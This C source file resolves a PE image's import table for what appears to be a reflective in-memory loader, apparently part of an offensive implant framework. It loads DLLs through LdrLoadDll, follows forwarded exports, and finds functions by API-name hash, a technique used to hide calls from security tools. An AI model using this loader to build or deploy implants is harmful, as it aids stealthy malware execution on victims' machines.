/**
 * Import.c - Import Table Resolution
 */

#include <Core.h>
#include <Win32.h>
#include <Utils.h>

SEC( text, F ) UINT_PTR LdrLoadModule( PINSTANCE pInstance, LPCSTR ModuleName )
{
    WCHAR       WideName[128];
    U_STRING    UStr    = { 0 };
    PVOID       Handle  = NULL;
    DWORD       i       = 0;

    for ( i = 0; ModuleName[i] && i < 127; i++ )
        WideName[i] = (WCHAR) ModuleName[i];
    WideName[i] = 0;

    UStr.Length        = (USHORT)( i * sizeof(WCHAR) );
    UStr.MaximumLength = (USHORT)( ( i + 1 ) * sizeof(WCHAR) );
    UStr.Buffer        = WideName;

    pInstance->Win32.LdrLoadDll( NULL, NULL, &UStr, &Handle );

    return (UINT_PTR) Handle;
}

SEC( text, F ) PVOID LdrFunctionByOrdinal( UINT_PTR Module, WORD Ordinal )
{
    PIMAGE_NT_HEADERS       NtHeaders      = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDir         = NULL;
    PDWORD                  AddressOfFuncs = NULL;
    DWORD                   Index          = 0;

    NtHeaders      = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDir         = C_PTR( Module + NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    AddressOfFuncs = C_PTR( Module + ExpDir->AddressOfFunctions );

    Index = Ordinal - (WORD) ExpDir->Base;

    return C_PTR( Module + AddressOfFuncs[ Index ] );
}

SEC( text, F ) PVOID LdrFunctionAddrFwd( PINSTANCE pInstance, UINT_PTR Module, UINT_PTR FuncHash )
{
    PIMAGE_NT_HEADERS       NtHeaders      = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDir         = NULL;
    PDWORD                  AddressOfFuncs = NULL;
    PDWORD                  AddressOfNames = NULL;
    PWORD                   AddressOfOrds  = NULL;
    DWORD                   ExportDirVA    = 0;
    DWORD                   ExportDirSize  = 0;

    NtHeaders     = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExportDirVA   = NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    ExportDirSize = NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    ExpDir        = C_PTR( Module + ExportDirVA );

    AddressOfNames = C_PTR( Module + ExpDir->AddressOfNames );
    AddressOfFuncs = C_PTR( Module + ExpDir->AddressOfFunctions );
    AddressOfOrds  = C_PTR( Module + ExpDir->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDir->NumberOfNames; i++ )
    {
        if ( HashString( C_PTR( Module + AddressOfNames[i] ), 0 ) == FuncHash )
        {
            DWORD FuncRVA = AddressOfFuncs[ AddressOfOrds[i] ];

            if ( FuncRVA >= ExportDirVA && FuncRVA < ExportDirVA + ExportDirSize )
            {
                CHAR  *FwdStr   = C_PTR( Module + FuncRVA );
                CHAR   DllName[128];
                CHAR  *FuncName = NULL;
                DWORD  j        = 0;

                for ( j = 0; FwdStr[j] && FwdStr[j] != '.' && j < 120; j++ )
                    DllName[j] = FwdStr[j];

                DllName[j]     = '.';
                DllName[j + 1] = 'd';
                DllName[j + 2] = 'l';
                DllName[j + 3] = 'l';
                DllName[j + 4] = '\0';

                FuncName = &FwdStr[j + 1];

                UINT_PTR FwdModule = LdrLoadModule( pInstance, DllName );
                if ( !FwdModule )
                    return NULL;

                return LdrFunctionAddrFwd( pInstance, FwdModule, HashString( FuncName, 0 ) );
            }

            return C_PTR( Module + FuncRVA );
        }
    }

    return NULL;
}

SEC( text, F ) VOID KaynLdrImport( PINSTANCE pInstance, LPVOID KVirtualMemory, PIMAGE_NT_HEADERS NtHeaders, DWORD KHdrSize )
{
    PIMAGE_DATA_DIRECTORY       ImportDir   = NULL;
    PIMAGE_IMPORT_DESCRIPTOR    pImportDesc = NULL;

    ImportDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

    if ( !ImportDir->VirtualAddress )
        return;

    pImportDesc = C_PTR( U_PTR( KVirtualMemory ) + ImportDir->VirtualAddress - KHdrSize );

    while ( pImportDesc->Name )
    {
        LPCSTR DllName = C_PTR( U_PTR( KVirtualMemory ) + pImportDesc->Name - KHdrSize );

        UINT_PTR Module = LdrLoadModule( pInstance, DllName );
        if ( !Module )
        {
            pImportDesc++;
            continue;
        }

        DWORD ILT_RVA = pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk;

        PIMAGE_THUNK_DATA pOrigThunk = C_PTR( U_PTR( KVirtualMemory ) + ILT_RVA - KHdrSize );
        PIMAGE_THUNK_DATA pThunk     = C_PTR( U_PTR( KVirtualMemory ) + pImportDesc->FirstThunk - KHdrSize );

        for ( ; pOrigThunk->u1.AddressOfData; pOrigThunk++, pThunk++ )
        {
            PVOID FuncAddr = NULL;

            if ( IMAGE_SNAP_BY_ORDINAL( pOrigThunk->u1.Ordinal ) )
            {
                FuncAddr = LdrFunctionByOrdinal( Module, (WORD) IMAGE_ORDINAL( pOrigThunk->u1.Ordinal ) );
            }
            else
            {
                PIMAGE_IMPORT_BY_NAME pImportByName = C_PTR( U_PTR( KVirtualMemory ) + pOrigThunk->u1.AddressOfData - KHdrSize );
                UINT_PTR NameHash = HashString( pImportByName->Name, 0 );
                FuncAddr = LdrFunctionAddrFwd( pInstance, Module, NameHash );
            }

            pThunk->u1.Function = (ULONG_PTR) FuncAddr;
        }

        pImportDesc++;
    }
}
